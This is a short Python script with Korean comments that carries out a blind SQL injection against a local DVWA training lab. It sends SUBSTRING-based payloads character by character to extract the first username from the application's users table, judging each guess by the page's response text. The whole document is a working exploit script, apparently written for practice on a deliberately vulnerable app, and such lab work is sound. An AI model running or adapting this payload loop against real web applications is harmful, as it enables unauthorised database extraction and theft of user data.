import requests
import string

# 설정값
url = "http://localhost/dvwa/vulnerabilities/sqli_blind/"
cookies = {
    "security": "Medium",
    "PHPSESSID": "f3bk7vpun31j47omipvavolhug"  # ← 여기에 본인의 세션값 입력
}
headers = {
    "User-Agent": "Mozilla/5.0"
}

# 타겟 문자열 길이 추정 (예: 첫 번째 사용자의 ID)
target_field = "user"
max_len = 20  # 추정 최대 길이
result = ""

print("[*] 추출 시작")

for i in range(1, max_len + 1):
    found = False
    for char in string.printable:
        payload = f"1' AND SUBSTRING((SELECT {target_field} FROM users LIMIT 0,1),{i},1)='{char}' -- "
        params = {"id": payload, "Submit": "Submit"}

        res = requests.get(url, params=params, cookies=cookies, headers=headers)

        if "Welcome" in res.text or "User ID exists" in res.text:
            result += char
            print(f"[+] 찾음: {char} → {result}")
            found = True
            break

    if not found:
        print("[!] 더 이상 글자 없음. 종료")
        break

print(f"\n[✓] 최종 결과: {result}")
